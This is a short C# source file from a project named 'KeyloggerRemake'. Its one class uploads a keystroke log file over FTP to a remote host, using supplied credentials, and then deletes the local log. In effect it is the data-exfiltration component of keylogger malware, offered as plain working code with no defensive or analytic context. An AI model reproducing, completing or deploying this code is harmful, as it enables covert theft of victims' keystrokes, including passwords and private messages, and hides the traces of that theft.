using System;
using System.IO;
using System.Net;

namespace KeyloggerRemake
{
    static class classFTP
    {
        public static void uploadLog(string strHost, string strUser, string strPass, string strLogName, string strLogFile)
        {
            string strUploadURL = strHost;

            if (strUploadURL.LastIndexOf('/') != -1)
            {
                strUploadURL += "/htdocs/";
            }
            else
            {
                strUploadURL += "htdocs/";
            }

            using (WebClient wc = new WebClient())
            {
                wc.Credentials = new NetworkCredential(strUser, strPass);
                try
                {
                    wc.UploadFile(strUploadURL + strLogName, WebRequestMethods.Ftp.UploadFile, strLogFile);
                    File.Delete(strLogFile);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }
    }
}
